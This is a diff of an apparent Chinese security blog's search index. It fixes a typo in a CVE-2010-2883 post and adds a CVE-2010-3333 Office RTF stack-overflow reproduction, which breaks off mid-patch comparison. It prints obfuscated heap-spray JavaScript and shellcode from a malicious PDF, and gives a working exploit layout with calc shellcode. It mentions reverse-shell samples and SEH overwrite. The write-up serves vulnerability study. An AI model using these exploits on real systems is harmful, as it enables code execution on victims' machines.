@@ -2516,7 +2516,7 @@
 </ol>
 <h2 id="样本中的利用"><a href="#样本中的利用" class="headerlink" title="样本中的利用"></a>样本中的利用</h2><p>我们现在知道了如何去执行payload，但是现在还有一个问题，就是我们要在栈溢出，也就是我们劫持程序执行流之前就要完成堆喷，那么这里又是如何完成的呢？？？<br>实际上，如果我们去找一下样本PDF中的对象，就会发现这样一段代码：</p>
 <div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">UdhOEvCxYfMjdcykVDRXmZibbUqbGGJtBwzJwjmhMAsUCVWSXXUtSJkpoAihGIiPbjePBWxGdshFSVeZBvVZaYgrIJhZfsqqjf</span> = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">RuwJFbqPzyLINqKkjnFlFpYXXbzpWTQrsPnTHLATwmStlCacfbQs</span> = <span class="title class_">UdhOEvCxYfMjdcykVDRXmZibbUqbGGJtBwzJwjmhMAsUCVWSXXUtSJkpoAihGIiPbjePBWxGdshFSVeZBvVZaYgrIJhZfsqqjf</span>( <span class="string">&#x27;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ucfda%u72bb%u8a93%ud9fd%u2474%u58f4%uc929%u31b1%u5831%u0318%u1858%uc083%u7176%u017f%uf79e%ufa80%u985e%u1f09%u986f%u6b6e%u28df%u39e4%uc3d3%ua9a8%ua160%udd64%u0cc1%ud053%u3dd2%u73a7%u3c50%u53f4%u8f69%u9509%uf2ae%uc7e0%u7867%uf856%u340c%u736b%ud85e%u60eb%udb16%u36da%u822d%ub9fc%ubee2%ua1b4%ufbe7%u590f%u70d3%u8b8e%u782a%uf23d%u8b83%u323f%u7423%u4a4a%u0950%u894d%ud52b%u0ad8%u9e8b%uf77b%u722a%u7c1d%u3f20%uda69%ube24%u50be%u4b50%ub741%u0fd1%u1366%ud4ba%u0207%uba66%u5438%u63c9%u1e9d%u70e7%u7cac%u866d%ufb22%u88c3%u043c%ue173%u8f0d%u761c%u5a92%u8859%uc7d8%u01cb%u9d85%u4c4e%u4836%u698c%u79b5%u8e6c%u0ba5%uca69%ue761%u4303%u0704%u64b0%u640d%uf757%u45cd%u7ff2%u9a77&#x27;</span> );</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span> = <span class="title class_">UdhOEvCxYfMjdcykVDRXmZibbUqbGGJtBwzJwjmhMAsUCVWSXXUtSJkpoAihGIiPbjePBWxGdshFSVeZBvVZaYgrIJhZfsqqjf</span>( <span class="string">&quot;%&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> );</span><br><span class="line"><span class="keyword">while</span> (<span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) <span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>+=<span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>;</span><br><span class="line">nwyVkBGWjTdNgPvAdXnouEREIY = <span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span>-<span class="number">0x24</span>)/<span class="number">2</span>);</span><br><span class="line">nwyVkBGWjTdNgPvAdXnouEREIY += <span class="title class_">RuwJFbqPzyLINqKkjnFlFpYXXbzpWTQrsPnTHLATwmStlCacfbQs</span>;</span><br><span class="line">nwyVkBGWjTdNgPvAdXnouEREIY += <span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>;</span><br><span class="line"><span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span> = nwyVkBGWjTdNgPvAdXnouEREIY.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span>.<span class="property">length</span> &lt; <span class="number">0x80000</span>) <span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span> += <span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span>;</span><br><span class="line">yCoMcbAoUUJKDGjtJdFHKVarhqRCCSDijQaImQNAKLUbXOSmWvplTduqUhdIoXcak = <span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span>.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span>-<span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CzLzwBYCuqCToWKkYDlAQiILHJjaTcumAQQrPISncRvzrjIXvckDydUQUSDYimBDbrTyjTlwhT</span> = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="title class_">LMQWIowdWtOoMkKwLOfujctvQYDqtloeBFXwdVvvbhsmmROVFXjWXhXHXJqRlBTtmNfgORlzpmpMxlounDQVzZbvNEWqyjx</span>=<span class="number">0</span>;<span class="title class_">LMQWIowdWtOoMkKwLOfujctvQYDqtloeBFXwdVvvbhsmmROVFXjWXhXHXJqRlBTtmNfgORlzpmpMxlounDQVzZbvNEWqyjx</span>&lt;<span class="number">0x1f0</span>;<span class="title class_">LMQWIowdWtOoMkKwLOfujctvQYDqtloeBFXwdVvvbhsmmROVFXjWXhXHXJqRlBTtmNfgORlzpmpMxlounDQVzZbvNEWqyjx</span>++) <span class="title class_">CzLzwBYCuqCToWKkYDlAQiILHJjaTcumAQQrPISncRvzrjIXvckDydUQUSDYimBDbrTyjTlwhT</span>[<span class="title class_">LMQWIowdWtOoMkKwLOfujctvQYDqtloeBFXwdVvvbhsmmROVFXjWXhXHXJqRlBTtmNfgORlzpmpMxlounDQVzZbvNEWqyjx</span>]=yCoMcbAoUUJKDGjtJdFHKVarhqRCCSDijQaImQNAKLUbXOSmWvplTduqUhdIoXcak+<span class="string">&quot;s&quot;</span>;</span><br></pre></td></tr></table></figure></div>
-<p>这段代码是经过混淆的，实际上，PDF是能够执行JavaScript代码的，所以在我们栈溢出之前，对喷已经完成了。</p>
+<p>这段代码是经过混淆的，实际上，PDF是能够执行JavaScript代码的，所以在我们栈溢出之前，堆喷已经完成了。</p>
 <h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>经过对该漏洞的复现，发现其实漏洞原理较漏洞利用还是比较简单，这里主要就是对于该漏洞的利用，要构造ROP链，利用堆喷技术跳转到ROP链上执行，然后就是对于ROP链中各个ROP指令的选择，这里为了绕过DEP，实际上利用了一种方法：利用未开启DEP的模块去绕过。</p>
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link"   href="https://sp4n9x.github.io/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/#" >CVE-2010-2883复现与分析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://www.anquanke.com/post/id/218543#h2-13" >初学CVE-2010-2883漏洞调试及复现<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://blog.csdn.net/magictong/article/details/7391397" >Heap Spray原理浅析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 ]]></content>
@@ -2991,6 +2991,260 @@
       </categories>
       <tags>
         <tag>Reverse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【漏洞复现】CVE-2010-3333漏洞复现</title>
+    <url>/2025/07/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2010-3333%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>上次我们复现了CVE-2010-2883，该漏洞是一个基于栈的缓冲区溢出漏洞，我们通过静态分析漏洞点，动态调试漏洞出发过程，动态调试以观察其漏洞利用过程，整个过程我们都进行得比较顺利，那么我们今天再来复现一下<code>CVE-2010-3333</code>漏洞，该漏洞也是一个基于栈的缓冲区溢出漏洞。<strong>对于上次的漏洞分析，有一个遗漏的点，就是目标软件是开启了ASLR的，但是我们没有分析对于Exploit的通用性，也就是对于ROP指令地址的选取没有深入研究，争取本次漏洞复现我们研究一下</strong>。</p>
+<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p><code>Microsoft Office</code>是微软发布的非常流行的<code>办公软件套件</code>。<code>CVE-2010-3333</code>(<a class="link"   href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-087" >微软编号：MS10-087<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)是Microsoft<code>Office XP SP3</code>、<code>Office 2003 SP3</code>、<code>Office 2007 SP2</code>、<code>Office 2010</code>，Mac<code>Office 2004</code>和<code>Office 2008</code>，Mac<code>Office 2011</code>和Mac的<code>Open XML文件格式转换器</code>中的<code>栈溢出漏洞</code>。主要是在处理<code>RTF</code>中的<code>“pFragments”属性</code>时存在栈溢出，导致攻击者可以借助<code>特制的RTF数据</code>执行<code>任意代码</code>，因此该漏洞又名<code>“RTF栈缓冲区溢出漏洞”</code>。</p>
+<h1 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h1><table>
+<thead>
+<tr>
+<th></th>
+<th>使用的环境</th>
+<th>备注</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作系统</td>
+<td>Windows XP Professional SP3</td>
+<td>简体中文版</td>
+<td></td>
+</tr>
+<tr>
+<td>虚拟机</td>
+<td>VMware Workstation Pro</td>
+<td>版本号:16.2.4</td>
+<td></td>
+</tr>
+<tr>
+<td>调试器</td>
+<td>x64Dbg</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>反汇编器</td>
+<td>IDA Pro</td>
+<td>版本号:9.1</td>
+<td></td>
+</tr>
+<tr>
+<td>漏洞软件</td>
+<td>Adobe Reader</td>
+<td>版本号:9.3.4</td>
+<td></td>
+</tr>
+<tr>
+<td><a class="link"   href="https://zhuanlan.zhihu.com/p/515904146" >Office 2003安装教程（附安装包）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>还是同样，我们使用<code>MSF</code>来分别生成弹出计算器和反弹Shell的样本文件。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715140333.png"
+                      alt="20250715140333"
+                ><br>我们使用目标软件打开，发现漏洞利用失败，没有弹出计算器，后面尝试了反弹shell，也是同样的结果，那正好，我们在后面分析的时候能调试一下漏洞利用模块。</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="1-RTF文件格式"><a href="#1-RTF文件格式" class="headerlink" title="1.RTF文件格式"></a>1.RTF文件格式</h2><p>RTF(Rich Text Fromat)是Microsoft公司为进行文本和图像信息格式的转换而指定的一种文件格式，它适用于不同的设备、操作环境和操作系统。RTF文件的基本元素是正文、控制字、控制符号和群组。<br>标准RTF文件只能包含7位ASCII字符，但可以通过转义序列对超出ASCII范围的字符进行编码。由于RTF由7位ASCII字符组成，所以可以在大多数基于PC的操作系统之间轻松传输。与大多数明文文件不同，RTF文件不必包含任何回车、换行符，RTF解析软件应忽略<code>CTLF</code>，除非他们可以用作控制字分隔符。当CRLF出现在主要组边界时，RTF文件更具可读性。</p>
+<h3 id="控制字（Control-word）"><a href="#控制字（Control-word）" class="headerlink" title="&lt;1&gt;.控制字（Control word）"></a>&lt;1&gt;.控制字（Control word）</h3><p>控制字是RTF文件用来标记打印控制符和管理文档信息的一种特殊格式的命令，RTF用它作为正文格式的控制代码，每个控制子均以一个反斜杠<code>\</code>开头，并且控制字区分大小写。ASCII字母序列由ASCII字母字符(a<del>z,A</del>Z)组成，控制字最初应该不包含任何大写字母，但是近年来，大写字母出现的在一些较新的控制字中，控制字的名称不能超过32个字符，而分隔符标志着控制字名称的结束。它的使用格式为<code>\字母系列&lt;分隔符&gt;</code>。</p>
+<h3 id="控制符号（Control-Symbol）"><a href="#控制符号（Control-Symbol）" class="headerlink" title="&lt;2&gt;.控制符号（Control Symbol）"></a>&lt;2&gt;.控制符号（Control Symbol）</h3><p>控制符号由反斜杠后跟一个单独的，非字母的字符，表示一个特定的符号。例如：<code>\~</code>表示一个不间断的空格。控制符没有分隔符，即控制符后面的空格被视为文本，而不是分隔符。</p>
+<h3 id="群（Group）"><a href="#群（Group）" class="headerlink" title="&lt;3&gt;.群（Group）"></a>&lt;3&gt;.群（Group）</h3><p>群组由包含在大括号中的文本、控制符或控制字符组成。左扩符<code>&#123;</code>标识组的开始，右括符<code>&#125;</code>标识组的结束。每个组包括文本和文本的属性。RTF文件也能同时包括字体、格式、屏幕颜色、图形、脚注、注释、文件头和文件尾、摘要信息、域和书签的组合，以及文档、区段、段落和字符的格式属性。<br>一个完整的RTF文件包括文件头<code>&lt;header&gt;</code>和文档区<code>&lt;document&gt;</code>两大部分，可以用下列语法表示：<br><code>&lt;File&gt;&#39;&#123;&#39;&lt;header&gt;&lt;document&gt;&#39;&#125;&#39;</code></p>
+<h2 id="2-定位漏洞点（基于栈回溯的方法）"><a href="#2-定位漏洞点（基于栈回溯的方法）" class="headerlink" title="2.定位漏洞点（基于栈回溯的方法）"></a>2.定位漏洞点（基于栈回溯的方法）</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>首先，我们使用<code>WinDbg</code>加载WinWord.exe<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715160033.png"
+                      alt="20250715160033"
+                ><br>可以看到我们断在了<code>ntdll</code>的<code>DbgBreakPoint</code>地址，然后我们使用命令<code>g</code>让其继续运行，运行起来之后，我们到MSF中生成一个用于调试的文件（只造成栈溢出，不用漏洞利用）：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715160416.png"
+                      alt="20250715160416"
+                ><br>然后我们用WINWORD软件打开，可以在<code>WinDbg</code>中看到断下来了：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715160629.png"
+                      alt="20250715160629"
+                ><br>这里发生错误的反汇编是：<code>rep movs dword ptr es:[edi],dword ptr [esi]</code>，其功能为循环将esi指向地址的值复制到edi指向地址的值。<br>我们使用<code>db esp</code>查看函数堆栈：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715161656.png"
+                      alt="20250715161656"
+                ><br>我们再从数据窗口调出edi指向的地址：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715161725.png"
+                      alt="20250715161725"
+                ><br>可以看到这时候已经发生了栈溢出，已经溢出到<code>0x130000</code>地址了。<br>我们使用<code>!address edi</code>命令查看edi指向的值：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715161942.png"
+                      alt="20250715161942"
+                ><br>我们看到该地址只有读权限，也就是说因为溢出到了一个只读地址，所以发生了异常，直接被调试器接过来了。<br>现在我们要做的就是去定位这条指令在哪：<br>我们从刚异常时的窗口可以看到发生异常时的指令：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715162404.png"
+                      alt="20250715162404"
+                ><br>我们从这里可以看到是在<code>mso.dll</code>中发生的异常。这里的目的是将源地址数据复制到目的地址，但是由于未经过大小检查，导致栈溢出，直至溢出到了一个非法地址。<br>我们现在知道了溢出发生在地址<code>0x30E9EB88</code>处，我们现在重新加载WinWrod.exe，并对该地址下断点（下断指令：bp）：<br><strong>这里解释一下为什么要重新加载下断点来寻找漏洞位置，因为函数调用链是基于栈上的返回地址去构造的，但是此时我们已经发生了栈溢出，函数调用链已经被破坏了，所以我们要下断点，然后向上寻找调用函数</strong>。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715170222.png"
+                      alt="20250715170222"
+                ><br>我们使用ub命令查看具体的函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715171106.png"
+                      alt="20250715171106"
+                ><br>其实还有更简单的，在函数调用链窗口里直接双击就行了，我们用函数调用链来看一下漏洞触发函数调用流程：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715172842.png"
+                      alt="20250715172842"
+                ><br>调用链：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715173038.png"
+                      alt="20250715173038"
+                ><br>至此，漏洞点我们已经定位出来了。</p>
+<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>我们已经通过静态分析定位出了漏洞点，但是为了更加掌握漏洞利用，我这里动态走一遍，这时候发现了一个点：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715175504.png"
+                      alt="20250715175504"
+                ><br>我们看到在<code>rep movs</code>的时候，ecx的值位<code>322b</code>，而这个值来自于<code>eax+8</code>，而在我们的样本中也存在这样的一个值：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715175613.png"
+                      alt="20250715175613"
+                ><br>它位于pFragements属性的第三个字段，偏移8个字符后的4个字符即位复制的数据大小，而<code>\xc8\xac</code>后面就是要复制的数据了，<code>esi</code>就指向这个地址：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715180028.png"
+                      alt="20250715180028"
+                ><br>我们再看一下目标地址，目标地址为<code>edi</code>，该寄存器值为<code>0x12a294</code>，而<code>ebp</code>指向<code>0x12a2a4</code>，也就是说只需要16个字节就会覆盖了，加上ebp本身4字节，也就是说只需20个字节，再覆盖下去就是返回地址了。<br>但是这里足足覆盖了c8ac个字节，这个数据量巨大，以至于SEH指针都被覆盖了。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>经过我们上面的分析，我们知道这就是一个简单的栈溢出，那我们看看其开启了哪些保护：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715182028.png"
+                      alt="20250715182028"
+                ><br>保护全开，但是由于是在XP下，ASLR是不支持的。但是在原文中，好像是没有开DEP的，那我们用书中的方法自己来构造一个ROP链。</p>
+<h2 id="ROP链构造"><a href="#ROP链构造" class="headerlink" title="ROP链构造"></a>ROP链构造</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>在构造ROP链之前，我们需要先观察一下，了解到需要多少字节能溢出到返回地址，程序有没有对堆栈进行操作等等：<br>经过前面的[[#动态调试]]，我们已知变量到ebp需要16字节，而ebp本身又占4字节，我们再观察一下触发漏洞的函数，我们在最后发现有一个<code>retn 14h</code>指令。<br>那我们就知道我们的payload该如何布置了：</p>
+<table>
+<thead>
+<tr>
+<th>局部变量(16字节)</th>
+<th>ebp(4字节)</th>
+<th>跳转地址(jmp esp)</th>
+<th>ret 14(20字节)</th>
+<th>ShellCode</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>我在<a class="link"   href="https://www.freebuf.com/vuls/230461.html" >CVE-2010-3333漏洞复现<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>这个页面上看到：地址0x7FFA4512（即魔法跳转地址，在Win7 32位以下版本中均指向jmp esp），我们看一下：</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250715201826.png"
+                      alt="20250715201826"
+                ></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>这个地址应该是可以使用的。</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>我们再来找一段ShellCode（<a class="link"   href="https://shell-storm.org/shellcode/index.html" >现成ShellCode网站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>）：</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> shellcode[] =         </span><br><span class="line">        <span class="string">&quot;\x31\xC9&quot;</span>                <span class="comment">// xor ecx,ecx        </span></span><br><span class="line">        <span class="string">&quot;\x51&quot;</span>                    <span class="comment">// push ecx        </span></span><br><span class="line">        <span class="string">&quot;\x68\x63\x61\x6C\x63&quot;</span>    <span class="comment">// push 0x636c6163        </span></span><br><span class="line">        <span class="string">&quot;\x54&quot;</span>                    <span class="comment">// push dword ptr esp        </span></span><br><span class="line">        <span class="string">&quot;\xB8\xC7\x93\xC2\x77&quot;</span>    <span class="comment">// mov eax,0x77c293c7        </span></span><br><span class="line">        <span class="string">&quot;\xFF\xD0&quot;</span>;               <span class="comment">// call eax         </span></span><br><span class="line"> </span><br><span class="line">    ((<span class="type">void</span>(*)())shellcode)();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>那么我们来构造EXP，<strong>这里需要注意一点，由于RTF文件的特殊性，我们需要将ASCII十六进制码以明文形式存储！</strong><br>我们布置好的payload：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716100021.png"
+                      alt="20250716100021"
+                ><br>但是在动态调试的时候发现，我们的跳板地址和ShellCode均有被破坏：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716100224.png"
+                      alt="20250716100224"
+                ><br>我们上面在介绍RTF文件格式的时候说到：控制字最初应该不包含任何大写字母，但是近年来，大写字母出现的在一些较新的控制字中，由于这是较早的office，所以我们应该改写为小写字母：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716101355.png"
+                      alt="20250716101355"
+                ><br>我们再次尝试，可以看到栈帧成功布置：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716101535.png"
+                      alt="20250716101535"
+                ><br>但是在后面mso.30F4CB1D函数压参数的时候：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716102340.png"
+                      alt="20250716102340"
+                ><br>，将42424242当作参数压了进去，这里应该是一个指针，这个参数错误，所以我们将其改为00：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716103017.png"
+                      alt="20250716103017"
+                ><br>再次尝试，可以看到我们这次成功执行过来了：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716103130.png"
+                      alt="20250716103130"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716103204.png"
+                      alt="20250716103204"
+                ><br>ShellCode成功执行：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716103239.png"
+                      alt="20250716103239"
+                ><br>我们不用调试器加载，直接打开该文档：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716103324.png"
+                      alt="20250716103324"
+                ><br>ShellCode也是成功执行了，这里出错的话，我们在ShellCode后面加上<code>ExitProcess</code>函数即可。</p>
+<h3 id="覆盖SEH指针"><a href="#覆盖SEH指针" class="headerlink" title="覆盖SEH指针"></a>覆盖SEH指针</h3><p>《漏洞战争》中还提到了第二种利用方式：覆盖SEH指针执行ShellCode。<br>对于覆盖SEH指针劫持程序流，我们需要先搞清楚SEH链，我们可以在x64dbg中清晰得看到SEH链：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CVE/20250716104703.png"
+                      alt="20250716104703"
+                ><br>我们只需要加大覆盖内存，将其SEH函数指针覆盖，结合跳板指令，即可执行ShellCode。</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>我们上面分析了漏洞发生的原因，就是因为没有对<code>pFragments</code>属性长度没有限制，导致栈溢出，我们只需要对其长度进行检测即可，这里我们看一下官方修复方法。<br>这里我拿到了patch前和patch后的mso.dll，我们分别使用IDA进行加载，然后保存idb文件，然后使用Biff插件进行比较：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//补丁前关键函数关键代码  </span></span><br><span class="line"><span class="type">char</span> __userpurge sub_32E5955E@&lt;al&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> *a5, <span class="type">int</span> a6)  </span><br><span class="line">&#123;  </span><br><span class="line">    ......  </span><br><span class="line">    <span class="keyword">if</span> ( a6 )  </span><br><span class="line">    &#123;  </span><br><span class="line">        v7 = *(_DWORD *)(sub_327A2549(*(_DWORD *)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);  </span><br><span class="line">        v17 = <span class="number">0</span>;  </span><br><span class="line">        v8 = *(_DWORD *)v7;  </span><br><span class="line">        v16 = <span class="number">83886080</span>;  </span><br><span class="line">        (*(<span class="type">void</span> (__stdcall **)(<span class="type">int</span>, <span class="type">int</span> *, <span class="type">int</span>))(v8 + <span class="number">28</span>))(v7, &amp;v15, a3);  </span><br><span class="line">        result = sub_32E5941B(v15, a2, a5 != <span class="number">0</span> ? (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v17 : <span class="number">0</span>, a6);  </span><br><span class="line">        <span class="keyword">if</span> ( result )  </span><br><span class="line">        &#123;  </span><br><span class="line">            ......  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        sub_32E6AEA8(<span class="number">863334498</span>);  </span><br><span class="line">        result = <span class="number">0</span>;  </span><br><span class="line">    &#125;  